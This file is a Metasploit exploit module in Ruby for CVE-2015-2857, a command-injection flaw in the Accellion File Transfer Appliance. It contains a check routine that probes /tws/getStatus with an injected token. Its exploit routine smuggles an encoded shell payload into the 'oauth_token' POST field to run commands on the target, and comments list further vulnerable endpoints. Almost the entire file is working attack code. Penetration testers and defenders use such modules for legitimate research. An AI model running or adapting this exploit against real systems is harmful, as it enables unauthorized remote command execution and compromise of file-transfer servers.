# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Accellion FTA getStatus verify_oauth_token Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a metacharacter shell injection vulnerability in the Accellion
        File Transfer appliance. This vulnerability is triggered when a user-provided
        &#039;oauth_token&#039; is passed into a system() call within a mod_perl handler. This
        module exploits the &#039;/tws/getStatus&#039; endpoint. Other vulnerable handlers include
        &#039;/seos/find.api&#039;, &#039;/seos/put.api&#039;, and /seos/mput.api&#039;. This issue was confirmed on
        fixed in software update FTA_9_11_210.
      },
      &#039;Author&#039;         => [ &#039;hdm&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://r-7.co/R7-2015-08&#039;],
          [&#039;CVE&#039;, &#039;2015-2857&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl bash telnet&#039;,
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 10 2015&#039;
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true])
      ], self.class)
  end

  def check
    uri = &#039;/tws/getStatus&#039;

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039; => {
        &#039;transaction_id&#039; => rand(0x100000000),
        &#039;oauth_token&#039;    => &#039;invalid&#039;
    }})

    unless res && res.code == 200 && res.body.to_s =~ /"result_msg":"MD5 token is invalid"/
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039; => {
        &#039;transaction_id&#039; => rand(0x100000000),
        &#039;oauth_token&#039;    => "&#039;;echo &#039;"
    }})

    unless res && res.code == 200 && res.body.to_s =~ /"result_msg":"Success","transaction_id":"/
      return Exploit::CheckCode::Safe
    end

    Msf::Exploit::CheckCode::Vulnerable
  end

  def exploit

    # The token is embedded into a command line the following:
    # `/opt/bin/perl /home/seos/system/call_webservice.pl $aid oauth_ws.php verify_access_token &#039;$token&#039; &#039;$scope&#039;`;
    token = "&#039;;#{payload.encoded};echo &#039;"

    uri   = &#039;/tws/getStatus&#039;

    # Other exploitable URLs:
    # * /seos/find.api (works with no other changes to this module)
    # * /seos/put.api  (requires some hoop jumping, upload)
    # * /seos/mput.api (requires some hoop jumping, token && upload)

    print_status("Sending request for #{uri}...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039; => {
        &#039;transaction_id&#039; => rand(0x100000000),
        &#039;oauth_token&#039;    => token
    }})

    if res && res.code == 200 && res.body.to_s =~ /"result_msg":"Success","transaction_id":"/
      print_status("Valid response received...")
    else
      if res
        print_error("Unexpected reply from the target: #{res.code} #{res.message} #{res.body}")
      else
        print_error("No reply received from the target")
      end
    end

    handler
  end

end

